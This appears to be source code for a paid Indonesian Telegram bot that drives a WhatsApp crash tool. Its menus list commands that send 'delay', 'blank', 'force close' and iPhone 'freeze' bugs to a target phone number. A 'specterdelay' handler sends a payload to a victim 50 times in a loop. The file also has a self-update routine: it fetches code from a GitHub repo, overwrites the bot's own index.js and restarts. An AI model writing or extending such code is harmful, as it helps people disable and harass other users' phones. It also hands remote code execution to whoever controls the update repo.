    fs.writeFileSync(PREM_GROUP_FILE, JSON.stringify([], null, 2));
  }
}

function loadPremGroups() {
  ensurePremGroupFile();
  try {
    const raw = fs.readFileSync(PREM_GROUP_FILE, "utf8");
    const data = JSON.parse(raw);
    return Array.isArray(data) ? data.map(String) : [];
  } catch {
    // kalau corrupt, reset biar aman
    fs.writeFileSync(PREM_GROUP_FILE, JSON.stringify([], null, 2));
    return [];
  }
}

function savePremGroups(groups) {
  ensurePremGroupFile();
  const unique = [...new Set(groups.map(String))];
  fs.writeFileSync(PREM_GROUP_FILE, JSON.stringify(unique, null, 2));
}

function isPremGroup(chatId) {
  const groups = loadPremGroups();
  return groups.includes(String(chatId));
}

function addPremGroup(chatId) {
  const groups = loadPremGroups();
  const id = String(chatId);
  if (groups.includes(id)) return false;
  groups.push(id);
  savePremGroups(groups);
  return true;
}

function delPremGroup(chatId) {
  const groups = loadPremGroups();
  const id = String(chatId);
  if (!groups.includes(id)) return false;
  const next = groups.filter((x) => x !== id);
  savePremGroups(next);
  return true;
}

bot.command("addpremgrup", async (ctx) => {
  if (ctx.from.id != ownerID) return ctx.reply("❌ ☇ Akses hanya untuk pemilik");

  const args = (ctx.message?.text || "").trim().split(/\s+/);

 
  let groupId = String(ctx.chat.id);

  if (ctx.chat.type === "private") {
    if (args.length < 2) {
      return ctx.reply("🪧 ☇ Format: /addpremgrup -1001234567890\nKirim di private wajib pakai ID grup.");
    }
    groupId = String(args[1]);
  } else {
 
    if (args.length >= 2) groupId = String(args[1]);
  }

  const ok = addPremGroup(groupId);
  if (!ok) return ctx.reply(`🪧 ☇ Grup ${groupId} sudah terdaftar sebagai grup premium.`);
  return ctx.reply(`✅ ☇ Grup ${groupId} berhasil ditambahkan ke daftar grup premium.`);
});

bot.command("delpremgrup", async (ctx) => {
  if (ctx.from.id != ownerID) return ctx.reply("❌ ☇ Akses hanya untuk pemilik");

  const args = (ctx.message?.text || "").trim().split(/\s+/);

  let groupId = String(ctx.chat.id);

  if (ctx.chat.type === "private") {
    if (args.length < 2) {
      return ctx.reply("🪧 ☇ Format: /delpremgrup -1001234567890\nKirim di private wajib pakai ID grup.");
    }
    groupId = String(args[1]);
  } else {
    if (args.length >= 2) groupId = String(args[1]);
  }

  const ok = delPremGroup(groupId);
  if (!ok) return ctx.reply(`🪧 ☇ Grup ${groupId} belum terdaftar sebagai grup premium.`);
  return ctx.reply(`✅ ☇ Grup ${groupId} berhasil dihapus dari daftar grup premium.`);
});

bot.command('addprem', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
    let userId;
    const args = ctx.message.text.split(" ");
    
    // Cek apakah menggunakan reply
    if (ctx.message.reply_to_message) {
        // Ambil ID dari user yang direply
        userId = ctx.message.reply_to_message.from.id.toString();
    } else if (args.length < 3) {
        return ctx.reply("🪧 ☇ Format: /addprem 12345678 30d\nAtau reply pesan user yang ingin ditambahkan");
    } else {
        userId = args[1];
    }
    
    // Ambil durasi
    const durationIndex = ctx.message.reply_to_message ? 1 : 2;
    const duration = parseInt(args[durationIndex]);
    
    if (isNaN(duration)) {
        return ctx.reply("🪧 ☇ Durasi harus berupa angka dalam hari");
    }
    
    const expiryDate = addpremUser(userId, duration);
    ctx.reply(`✅ ☇ ${userId} berhasil ditambahkan sebagai pengguna premium sampai ${expiryDate}`);
});

// VERSI MODIFIKASI UNTUK DELPREM (dengan reply juga)
bot.command('delprem', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
    let userId;
    const args = ctx.message.text.split(" ");
    
    // Cek apakah menggunakan reply
    if (ctx.message.reply_to_message) {
        // Ambil ID dari user yang direply
        userId = ctx.message.reply_to_message.from.id.toString();
    } else if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /delprem 12345678\nAtau reply pesan user yang ingin dihapus");
    } else {
        userId = args[1];
    }
    
    removePremiumUser(userId);
    ctx.reply(`✅ ☇ ${userId} telah berhasil dihapus dari daftar pengguna premium`);
});



bot.command('addgcpremium', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 3) {
        return ctx.reply("🪧 ☇ Format: /addgcpremium -12345678 30d");
    }

    const groupId = args[1];
    const duration = parseInt(args[2]);

    if (isNaN(duration)) {
        return ctx.reply("🪧 ☇ Durasi harus berupa angka dalam hari");
    }

    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');

    premiumUsers[groupId] = expiryDate;
    savePremiumUsers(premiumUsers);

    ctx.reply(`✅ ☇ ${groupId} berhasil ditambahkan sebagai grub premium sampai ${expiryDate}`);
});

bot.command('delgcpremium', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /delgcpremium -12345678");
    }

    const groupId = args[1];
    const premiumUsers = loadPremiumUsers();

    if (premiumUsers[groupId]) {
        delete premiumUsers[groupId];
        savePremiumUsers(premiumUsers);
        ctx.reply(`✅ ☇ ${groupId} telah berhasil dihapus dari daftar pengguna premium`);
    } else {
        ctx.reply(`🪧 ☇ ${groupId} tidak ada dalam daftar premium`);
    }
});

const pendingVerification = new Set();
// ================
// 🔐 VERIFIKASI TOKEN
// ================
bot.use(async (ctx, next) => {
  if (secureMode) return next();
  if (tokenValidated) return next();

  const chatId = (ctx.chat && ctx.chat.id) || (ctx.from && ctx.from.id);
  if (!chatId) return next();
  if (pendingVerification.has(chatId)) return next();
  pendingVerification.add(chatId);

  const sleep = (ms) => new Promise((res) => setTimeout(res, ms));
  const frames = [
    "▰▱▱▱▱▱▱▱▱▱ 10%",
    "▰▰▱▱▱▱▱▱▱▱ 20%",
    "▰▰▰▱▱▱▱▱▱▱ 30%",
    "▰▰▰▰▱▱▱▱▱▱ 40%",
    "▰▰▰▰▰▱▱▱▱▱ 50%",
    "▰▰▰▰▰▰▱▱▱▱ 60%",
    "▰▰▰▰▰▰▰▱▱▱ 70%",
    "▰▰▰▰▰▰▰▰▱▱ 80%",
    "▰▰▰▰▰▰▰▰▰▱ 90%",
    "▰▰▰▰▰▰▰▰▰▰ 100%"
  ];

  let loadingMsg = null;

  try {
    loadingMsg = await ctx.reply("⏳ *BOT SEDANG MEMVERIFIKASI TOKEN...*", {
      parse_mode: "Markdown"
    });

    for (const frame of frames) {
      if (tokenValidated) break;
      await sleep(180);
      try {
        await ctx.telegram.editMessageText(
          loadingMsg.chat.id,
          loadingMsg.message_id,
          null,
          `🔐 *Verifikasi Token Server...*\n${frame}`,
          { parse_mode: "Markdown" }
        );
      } catch { /* skip */ }
    }

    if (!databaseUrl || !tokenBot) {
      await ctx.telegram.editMessageText(
        loadingMsg.chat.id,
        loadingMsg.message_id,
        null,
        "⚠️ *Konfigurasi server tidak lengkap.*\nPeriksa `databaseUrl` atau `tokenBot`.",
        { parse_mode: "Markdown" }
      );
      pendingVerification.delete(chatId);
      return;
    }

    // Fungsi ambil data token pakai HTTPS native
    const getTokenData = () => new Promise((resolve, reject) => {
      https.get(databaseUrl, { timeout: 6000 }, (res) => {
        let data = "";
        res.on("data", (chunk) => (data += chunk));
        res.on("end", () => {
          try {
            const json = JSON.parse(data);
            resolve(json);
          } catch {
            reject(new Error("Invalid JSON response"));
          }
        });
      }).on("error", (err) => reject(err));
    });

    let result;
    try {
      result = await getTokenData();
    } catch (err) {
      await ctx.telegram.editMessageText(
        loadingMsg.chat.id,
        loadingMsg.message_id,
        null,
        "⚠️ *Gagal mengambil daftar token dari server.*\nSilakan coba lagi nanti.",
        { parse_mode: "Markdown" }
      );
      pendingVerification.delete(chatId);
      return;
    }

    const tokens = (result && Array.isArray(result.tokens)) ? result.tokens : [];
    if (tokens.length === 0) {
      await ctx.telegram.editMessageText(
        loadingMsg.chat.id,
        loadingMsg.message_id,
        null,
        "⚠️ *Token tidak tersedia di database.*\nHubungi admin untuk memperbarui data.",
        { parse_mode: "Markdown" }
      );
      pendingVerification.delete(chatId);
      return;
    }

    // Validasi token
    if (tokens.includes(tokenBot)) {
      tokenValidated = true;
      await ctx.telegram.editMessageText(
        loadingMsg.chat.id,
        loadingMsg.message_id,
        null,
        "✅ *Token diverifikasi server!*\nMembuka menu utama...",
        { parse_mode: "Markdown" }
      );
      await sleep(1000);
      pendingVerification.delete(chatId);
      return next();
    } else {
      const keyboardBypass = {
        inline_keyboard: [
          [{ text: "Buy Script", url: "https://t.me/RidzzOffc" }]
        ]
      };

      await ctx.telegram.editMessageText(
        loadingMsg.chat.id,
        loadingMsg.message_id,
        null,
        "*Bypass Detected!*\nToken tidak sah atau tidak terdaftar.\nYour access has been restricted.",
        { parse_mode: "Markdown" }
      );

      await sleep(500);
      await ctx.replyWithPhoto("https://files.catbox.moe/yuq6rs.jpg", {
        caption:
          "🚫 *Access Denied*\nSistem mendeteksi token tidak valid.\nGunakan versi original dari owner.",
        parse_mode: "Markdown",
        reply_markup: keyboardBypass
      });

      pendingVerification.delete(chatId);
      return;
    }

  } catch (err) {
    console.error("Verification Error:", err);
    if (loadingMsg) {
      await ctx.telegram.editMessageText(
        loadingMsg.chat.id,
        loadingMsg.message_id,
        null,
        "⚠️ *Terjadi kesalahan saat memverifikasi token.*",
        { parse_mode: "Markdown" }
      );
    } else {
      await ctx.reply("⚠️ *Terjadi kesalahan saat memverifikasi token.*", {
        parse_mode: "Markdown"
      });
    }
  } finally {
    pendingVerification.delete(chatId);
  }
});

// ================== MODULE ==================
const fs = require("fs");
const path = require("path");
const fsp = fs.promises;

// ================== LOAD CONFIG (NO CACHE) ==================
function loadUpdateConfig() {
  try {
    const cfgPath = path.join(process.cwd(), "update.js");
    try { delete require.cache[require.resolve(cfgPath)]; } catch (_) {}
    const cfg = require(cfgPath);
    return (cfg && typeof cfg === "object") ? cfg : {};
  } catch {
    return {};
  }
}

const UPD = loadUpdateConfig();

// ================== CONFIG ==================
const GITHUB_OWNER = UPD.github_owner || " anything-101";
const DEFAULT_REPO = UPD.github_repo_default || "Autoupdate";
const GITHUB_BRANCH = UPD.github_branch || "main";
const UPDATE_FILE_IN_REPO = UPD.update_file_in_repo || "index.js";
const GITHUB_TOKEN_WRITE = UPD.github_token_write || "";
const LOCAL_TARGET_FILE = path.join(process.cwd(), "index.js");

let updatePending = true;

// ================== FETCH ==================
const fetchFn =
  global.fetch ||
  ((...args) => import("node-fetch").then(({ default: f }) => f(...args)));

// ================== ATOMIC WRITE ==================
async function atomicWriteFile(targetPath, content) {
  const dir = path.dirname(targetPath);
  const tmp = path.join(dir, `.tmp_${Date.now()}_${path.basename(targetPath)}`);
  await fsp.writeFile(tmp, content, "utf8");
  await fsp.rename(tmp, targetPath);
}

// ================== GITHUB RAW DOWNLOAD ==================
async function ghDownloadRawPublic(repo, filePath) {
  const rawUrl =
    `https://raw.githubusercontent.com/${GITHUB_OWNER}/${repo}/${GITHUB_BRANCH}/${filePath}`;

  const res = await fetchFn(rawUrl, {
    headers: { "User-Agent": "super-sonic-bot" },
  });

  if (!res.ok) {
    const txt = await res.text().catch(() => "");
    throw new Error(`Download gagal (${res.status}) ${txt}`);
  }

  return res.text();
}

// ================== WRITE TOKEN CHECK ==================
function mustWriteToken() {
  if (!GITHUB_TOKEN_WRITE)
    throw new Error("github_token_write kosong di update.js");
}

function ghWriteHeaders() {
  mustWriteToken();
  return {
    Authorization: `Bearer ${GITHUB_TOKEN_WRITE}`,
    Accept: "application/vnd.github+json",
    "User-Agent": "super-sonic-writer",
  };
}

// ================== GITHUB WRITE ==================
async function ghPutFileWrite(repo, filePath, contentText, commitMsg) {
  const url = `https://api.github.com/repos/${GITHUB_OWNER}/${repo}/contents/${filePath}`;

  const body = {
    message: commitMsg,
    content: Buffer.from(contentText, "utf8").toString("base64"),
    branch: GITHUB_BRANCH,
  };

  const res = await fetchFn(url, {
    method: "PUT",
    headers: { ...ghWriteHeaders(), "Content-Type": "application/json" },
    body: JSON.stringify(body),
  });

  if (!res.ok) throw new Error(`Upload gagal (${res.status})`);
}

// ================== GITHUB DELETE ==================
async function ghDeleteFileWrite(repo, filePath, commitMsg) {
  const getUrl = `https://api.github.com/repos/${GITHUB_OWNER}/${repo}/contents/${filePath}?ref=${GITHUB_BRANCH}`;

  const info = await fetchFn(getUrl, { headers: ghWriteHeaders() });
  const json = await info.json();
  const sha = json.sha;

  const delUrl = `https://api.github.com/repos/${GITHUB_OWNER}/${repo}/contents/${filePath}`;

  await fetchFn(delUrl, {
    method: "DELETE",
    headers: { ...ghWriteHeaders(), "Content-Type": "application/json" },
    body: JSON.stringify({ message: commitMsg, sha, branch: GITHUB_BRANCH }),
  });
}

// ==========================================================
// ====================== COMMANDS ==========================
// ==========================================================

// 🚀 /pullupdate
bot.command("pullupdate", async (ctx) => {
  try {
    updatePending = false;

    await ctx.reply("🚀 *SUPER SONIC UPDATE*\n\nMengambil versi terbaru...", { parse_mode: "Markdown" });

    const newCode = await ghDownloadRawPublic(DEFAULT_REPO, UPDATE_FILE_IN_REPO);

    if (!newCode || newCode.length < 50)
      throw new Error("File update tidak valid.");

    try {
      await fsp.copyFile(LOCAL_TARGET_FILE, "index.backup.js");
    } catch {}

    await atomicWriteFile(LOCAL_TARGET_FILE, newCode);

    await ctx.reply("✅ Update sukses.\n♻️ Panel restart otomatis...");
    setTimeout(() => process.exit(0), 3000);

  } catch (err) {
    ctx.reply(`❌ ${err.message}`);
  }
});

// 📤 /addfile
bot.command("addfile", async (ctx) => {
  try {
    const replied = ctx.message.reply_to_message;
    const doc = replied?.document;
    if (!doc) return ctx.reply("Reply file .js dulu.");

    const link = await ctx.telegram.getFileLink(doc.file_id);
    const res = await fetchFn(link.href);
    const content = await res.text();

    await ghPutFileWrite(DEFAULT_REPO, doc.file_name, content, "Upload via bot");

    ctx.reply("✅ File berhasil diupload.");
  } catch (e) {
    ctx.reply(`❌ ${e.message}`);
  }
});

// 🗑 /dellfile
bot.command("dellfile", async (ctx) => {
  try {
    const parts = ctx.message.text.split(" ");
    const file = parts[1];
    if (!file) return ctx.reply("Format: /dellfile namafile.js");

    await ghDeleteFileWrite(DEFAULT_REPO, file, "Delete via bot");
    ctx.reply("✅ File berhasil dihapus.");
  } catch (e) {
    ctx.reply(`❌ ${e.message}`);
  }
});

// ♻️ /restart
bot.command("restart", async (ctx) => {
  await ctx.reply("♻️ Restarting panel...");
  setTimeout(() => process.exit(0), 3000);
});

// ==========================================================
// =============== AUTO WARNING SYSTEM ======================
// ==========================================================

bot.use(async (ctx, next) => {
  if (!ctx.message) return next();

  if (ctx.message.text?.startsWith("/pullupdate")) return next();

  if (updatePending) {
    updatePending = false;

    await ctx.replyWithPhoto(
      "https://files.catbox.moe/kekyp3.jpg",
      {
        caption:
`⚠️ *SYSTEM NOTICE*

Panel baru aktif.
Disarankan melakukan update.

Tekan tombol di bawah ini.`,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "🚀 PULL UPDATE", callback_data: "auto_pullupdate" }]
          ]
        }
      }
    );
  }

  next();
});

// 🔘 BUTTON HANDLER
bot.action("auto_pullupdate", async (ctx) => {
  await ctx.answerCbQuery("Memulai update...");
  updatePending = false;

  try {
    const newCode = await ghDownloadRawPublic(DEFAULT_REPO, UPDATE_FILE_IN_REPO);
    await atomicWriteFile(LOCAL_TARGET_FILE, newCode);

    await ctx.editMessageCaption("✅ Update berhasil.\n♻️ Restarting...");
    setTimeout(() => process.exit(0), 3000);

  } catch (err) {
    await ctx.editMessageCaption(`❌ ${err.message}`);
  }
});

// =========================
// START COMMAND & 
// =========================
bot.start(async (ctx) => {
  if (!tokenValidated)
    return ctx.reply("❌ *Token belum diverifikasi server.* Tunggu proses selesai.", { parse_mode: "Markdown" });
  
  const userId = ctx.from.id;
  const isOwner = userId == ownerID;
  const premiumStatus = isPremiumUser(ctx.from.id) ? "Yes" : "No";
  const senderStatus = isWhatsAppConnected ? "Yes" : "No";
  const runtimeStatus = formatRuntime();
  const memoryStatus = formatMemory();

  // ============================
  // 🔓 OWNER BYPASS FULL
  // ============================
  if (!isOwner) {
    // Jika user buka di private → blokir
    if (ctx.chat.type === "private") {
      // Kirim notifikasi ke owner
      bot.telegram.sendMessage(
        ownerID,
        `📩 *NOTIFIKASI START PRIVATE*\n\n` +
        `👤 User: ${ctx.from.first_name || ctx.from.username}\n` +
        `🆔 ID: <code>${ctx.from.id}</code>\n` +
        `🔗 Username: @${ctx.from.username || "-"}\n` +
        `💬 Akses private diblokir.\n\n` +
        `⌚ Waktu: ${new Date().toLocaleString("id-ID")}`,
        { parse_mode: "HTML" }
      );
      return ctx.reply("❌ Bot ini hanya bisa digunakan di grup yang memiliki akses.");
    }
  }
  
 
if (ctx.from.id != ownerID && !isPremGroup(ctx.chat.id)) {
  return ctx.reply("❌ ☇ Grup ini belum terdaftar sebagai GRUP PREMIUM.");
}

  const menuMessage = `
<pre><code class="language-javascript">
⬡═—⊱ 𝗦𝗨𝗣𝗘𝗥 ☇ 𝗦𝗢𝗡𝗜𝗖 ⊰—═⬡
  ᴏᴡɴᴇʀ : @RidzzOffc
  ᴠᴇʀsɪᴏɴ : 0.0
  
⬡═—⊱ STATUS BOT ⊰—═⬡
  ʙᴏᴛ sᴛᴀᴛᴜs : ${premiumStatus}  
  ᴜsᴇʀɴᴀᴍᴇ  : @${ctx.from.username || "Tidak Ada"}
  ᴜsᴇʀ ɪᴅ    : <code>${userId}</code>
  sᴛᴀᴛᴜs sᴇɴᴅᴇʀ : ${senderStatus}  
  ʙᴏᴛ ᴜᴘᴛɪᴍᴇ : ${runtimeStatus}

⬡═—⊱ SECURITY ⊰—═⬡
  ᴏᴛᴘ sʏsᴛᴇᴍ : ᴀᴄᴛɪᴠᴇ
  ᴛᴏᴋᴇɴ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ : ᴇɴᴀʙʟᴇᴅ
  
🤲RAMADHAN KAREEM🤲

⧫━⟢『 THANKS 』⟣━⧫</code></pre>`;

  const keyboard = [
        [
            { text: "◀️", callback_data: "menu_tqto" },
            { text: "Home", callback_data: "menu_home" },
            { text: "▶️", callback_data: "menu_controls" }
        ],
        [
            { text: "Owner", url: "https://t.me/RidzzOffc" }
        ]
    ];

    ctx.replyWithPhoto(thumbnailUrl, {
        caption: menuMessage,
        parse_mode: "HTML",
        reply_markup: {
            inline_keyboard: keyboard
        }
    });
});

// ======================
// CALLBACK UNTUK MENU UTAMA (HOME)
// ======================
bot.action("menu_home", async (ctx) => {
  if (!tokenValidated)
    return ctx.answerCbQuery("🔑 Token belum diverifikasi server.");

  const userId = ctx.from.id;
  const premiumStatus = isPremiumUser(ctx.from.id) ? "Yes" : "No";
  const senderStatus = isWhatsAppConnected ? "Yes" : "No";
  const runtimeStatus = formatRuntime();

  const menuMessage = `
<pre><code class="language-javascript">
⬡═—⊱ 𝗦𝗨𝗣𝗘𝗥 ☇ 𝗦𝗢𝗡𝗜𝗖 ⊰—═⬡
  ᴏᴡɴᴇʀ : @RidzzOffc
  ᴠᴇʀsɪᴏɴ : 0.0
  
⬡═—⊱ STATUS BOT ⊰—═⬡
  ʙᴏᴛ sᴛᴀᴛᴜs : ${premiumStatus}  
  ᴜsᴇʀɴᴀᴍᴇ  : @${ctx.from.username || "Tidak Ada"}
  ᴜsᴇʀ ɪᴅ    : <code>${userId}</code>
  sᴛᴀᴛᴜs sᴇɴᴅᴇʀ : ${senderStatus}  
  ʙᴏᴛ ᴜᴘᴛɪᴍᴇ : ${runtimeStatus}

⬡═—⊱ SECURITY ⊰—═⬡
  ᴏᴛᴘ sʏsᴛᴇᴍ : ᴀᴄᴛɪᴠᴇ
  ᴛᴏᴋᴇɴ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ : ᴇɴᴀʙʟᴇᴅ
  
🤲RAMADHAN KAREEM🤲

⧫━⟢『 THANKS 』⟣━⧫</code></pre>`;

  const keyboard = [
        [
            { text: "◀️", callback_data: "menu_tqto" },
            { text: "Home", callback_data: "menu_home" },
            { text: "▶️", callback_data: "menu_controls" }
        ],
        [
            { text: "Owner", url: "https://t.me/RidzzOffc" }
        ]
    ];

    try {
        await ctx.editMessageMedia({
            type: 'photo',
            media: thumbnailUrl,
            caption: menuMessage,
            parse_mode: "HTML",
        }, {
            reply_markup: { inline_keyboard: keyboard }
        });
        await ctx.answerCbQuery();

    } catch (error) {
        if (
            error.response &&
            error.response.error_code === 400 &&
            (error.response.description.includes("メッセージは変更されませんでした") || 
             error.response.description.includes("message is not modified"))
        ) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error saat mengirim menu:", error);
            await ctx.answerCbQuery("⚠️ Terjadi kesalahan, coba lagi");
        }
    }
});

// ======================
// MENU CONTROLS
// ======================
bot.action('menu_controls', async (ctx) => {
    const controlsMenu = `
<pre><code class="language-javascript">
⬡═―—⊱ SYSTEM CONTROL ⊰―—═⬡
  /addbot     - Add Sender
  /setcd      - Set Cooldown
  /killsesi   - Reset Session

⬡═―—⊱ USER MANAGEMENT ⊰―—═⬡
  /addprem    - Add Premium
  /delprem    - Delete Premium
  /addpremgrup   - Add Premium Group
  /delpremgrup   - Delete Premium Group

🌙 Page 2/6 🌙</code></pre>`;

    const keyboard = [
        [
            { text: "◀️", callback_data: "menu_home" },
            { text: "Home", callback_data: "menu_home" },
            { text: "▶️", callback_data: "menu_toolss" }
        ],
        [
            { text: "Owner", url: "https://t.me/RidzzOffc" }
        ]
    ];

    try {
        await ctx.editMessageCaption(controlsMenu, {
            parse_mode: "HTML",
            reply_markup: { inline_keyboard: keyboard }
        });
        await ctx.answerCbQuery();
    } catch (error) {
        if (error.response && error.response.error_code === 400 && 
            (error.response.description.includes("メッセージは変更されませんでした") || 
             error.response.description.includes("message is not modified"))) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error di controls menu:", error);
            await ctx.answerCbQuery("⚠️ Terjadi kesalahan, coba lagi");
        }
    }
});

// ======================
// MENU TOOLSS
// ======================
bot.action('menu_toolss', async (ctx) => {
    const toolssMenu = `
<pre><code class="language-javascript">
⬡═―—⊱ DEVICE & GENERATOR ⊰―—═⬡
  /iqc        - iPhone Generator
  /zenc      - Encrypted File.Js
  /play       - Play Music Spotify
  /fixcode    - Fixed File.Js

⬡═―—⊱ MEDIA & DOWNLOADER ⊰―—═⬡
  /brat       - Brat sticker
  /tiktok     - Downloader Tiktok
  /tourl      - To Url Image/Video
  /tourl2     - To Url Image
  /fakecall   - Reply Foto To Avatar

🌙 Page 3/6 🌙</code></pre>`;

    const keyboard = [
        [
            { text: "◀️", callback_data: "menu_controls" },
            { text: "Home", callback_data: "menu_home" },
            { text: "▶️", callback_data: "menu_bug" }
        ],
        [
            { text: "Owner", url: "https://t.me/RidzzOffc" }
        ]
    ];

    try {
        await ctx.editMessageCaption(toolssMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
        await ctx.answerCbQuery();
    } catch (error) {
        if (error.response && error.response.error_code === 400 && 
            (error.response.description.includes("メッセージは変更されませんでした") || 
             error.response.description.includes("message is not modified"))) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error di toolss menu:", error);
            await ctx.answerCbQuery("⚠️ Terjadi kesalahan, coba lagi");
        }
    }
});

// ======================
// MENU BUG INVISIBLE
// ======================
bot.action('menu_bug', async (ctx) => {
    const bugMenu = `
<pre><code class="language-javascript">
🌙 DELAY INVISIBLE BUG 🌙

⬡═―—⊱ DELAY TYPE ⊰―—═⬡
  /delayinvis   - 628xx [ DELAY HARD INVSBLE ]
  /force     - 628xx [ FORCLOSE FOT MURBUG ]
  /twinsdelay     - 628xx [ BEBAS SPAM NO LOG UT ]
  /aquaticdelay  - 628xx [ DELAY HARD BEBAS SPAM ]
  /flowerdly      - 628xx [ DELAY HARD INFINITY ]
  /delayduration  - 628xx [ HARD DELAY 1000% ]
  /delayv2     - 628xx [ DELAY ADALAH POKOKNYA ]
  /delaymention    - 628xx [ DELAY INVISIBLE MENTION ]

🌙 Page 4/6 🌙</code></pre>`;

    const keyboard = [
        [
            { text: "◀️", callback_data: "menu_toolss" },
            { text: "Home", callback_data: "menu_home" },
            { text: "▶️", callback_data: "menu_bug2" }
        ],
        [
            { text: "Owner", url: "https://t.me/RidzzOffc" }
        ]
    ];

    try {
        await ctx.editMessageCaption(bugMenu, {
            parse_mode: "HTML",
            reply_markup: { inline_keyboard: keyboard }
        });
        await ctx.answerCbQuery();
    } catch (error) {
        if (error.response && error.response.error_code === 400 && 
            (error.response.description.includes("メッセージは変更されませんでした") || 
             error.response.description.includes("message is not modified"))) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error di bug menu:", error);
            await ctx.answerCbQuery("⚠️ Terjadi kesalahan, coba lagi");
        }
    }
});

// ======================
// MENU BUG INVISIBLE
// ======================
bot.action('menu_bug2', async (ctx) => {
    const bugMenu2 = `
<pre><code class="language-javascript">
🌙 VISIBLE BUG 🌙

⬡═―—⊱ VISIBLE TYPE ⊰―—═⬡
  /blankstc    - 628xx [ BLANK STUCK ANDROID ]
  /crashui     - 628xx [ CRASH UI ANDROID ]
  /fireblank    - 628xx [ BLANK INFINITY ]
  /efceclick    - 628xx [ FORCE CLOSE CLICK ]
  /applefreeze  - 628xx [ FREEZE HOME IPHONE ]
  /combox      - 628xx [ COMBO BUG ]
  /applecrash    - 628xx [ FORCE CLOSE IPHONE ]
  /crashblank     - 628xx [ BLANK ANDROID ]

🌙 Page 5/6 🌙</code></pre>`;

    const keyboard = [
        [
            { text: "◀️", callback_data: "menu_bug" },
            { text: "Home", callback_data: "menu_home" },
            { text: "▶️", callback_data: "menu_tqto" }
        ],
        [
            { text: "Owner", url: "https://t.me/RidzzOffc" }
        ]
    ];

    try {
        await ctx.editMessageCaption(bugMenu2, {
            parse_mode: "HTML",
            reply_markup: { inline_keyboard: keyboard }
        });
        await ctx.answerCbQuery();
    } catch (error) {
        if (error.response && error.response.error_code === 400 && 
            (error.response.description.includes("メッセージは変更されませんでした") || 
             error.response.description.includes("message is not modified"))) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error di bug menu:", error);
            await ctx.answerCbQuery("⚠️ Terjadi kesalahan, coba lagi");
        }
    }
});

// ======================
// MENU TQTO
// ======================
bot.action('menu_tqto', async (ctx) => {
    const tqtoMenu = `
<pre><code class="language-javascript">
🌙 RAMADHAN 1447H 🌙

⬡═―—⊱ THANKS TO ⊰―—═⬡
  Xwar   ( Best Support )
  Xatanical ( My Idola ) 
  Zeyn ( My Babu ) 
  Marzz ( My Support ) 
  Fiff ( My Prend ) 
  Narendra ( My Support ) 
  All Buyer 𝗦𝗨𝗣𝗘𝗥 ☇ 𝗦𝗢𝗡𝗜𝗖
  All Partner & Owner RidzzGantenk

🌙 Page 6/6 🌙
🤲 RAMADHAN KAREEM 🤲</code></pre>`;

    const keyboard = [
        [
            { text: "◀️", callback_data: "menu_bug2" },
            { text: "Home", callback_data: "menu_home" },
            { text: "▶️", callback_data: "menu_home" }
        ],
        [
            { text: "Owner", url: "https://t.me/RidzzOffc" }
        ]
    ];

    try {
        await ctx.editMessageCaption(tqtoMenu, {
            parse_mode: "HTML",
            reply_markup: { inline_keyboard: keyboard }
        });
        await ctx.answerCbQuery();
    } catch (error) {
        if (error.response && error.response.error_code === 400 && 
            (error.response.description.includes("メッセージは変更されませんでした") || 
             error.response.description.includes("message is not modified"))) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error di tqto menu:", error);
            await ctx.answerCbQuery("⚠️ Terjadi kesalahan, coba lagi");
        }
    }
});


//CASE BUG
bot.command("specterdelay", checkWhatsAppConnection,checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /specterdelay 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;
  

if (ctx.from.id != ownerID && !isPremGroup(ctx.chat.id)) {
  return ctx.reply("❌ ☇ Grup ini belum terdaftar sebagai GRUP PREMIUM.");
}
  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<pre><code class="language-javascript">⟡━⟢ 𝗦𝗨𝗣𝗘𝗥 ☇ 𝗦𝗢𝗡𝗜𝗖 ⟣━⟡
⌑ Target: ${q}
⌑ Type: Delay Hard Invisible
⌑ Status: Process
╘═——————————————═⬡</code></pre>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 50; i++) {
    await retryDelay(sock, target);
    await sleep(2000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<pre><code class="language-javascript">⟡━⟢ 𝗦𝗨𝗣𝗘𝗥 ☇ 𝗦𝗢𝗡𝗜𝗖 ⟣━⟡
⌑ Target: ${q}
⌑ Type: Delay Hard Invisible
⌑ Status: Success
╘═——————————————═⬡</code></pre>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("blankstc", checkWhatsAppConnection, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /blankstc  62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

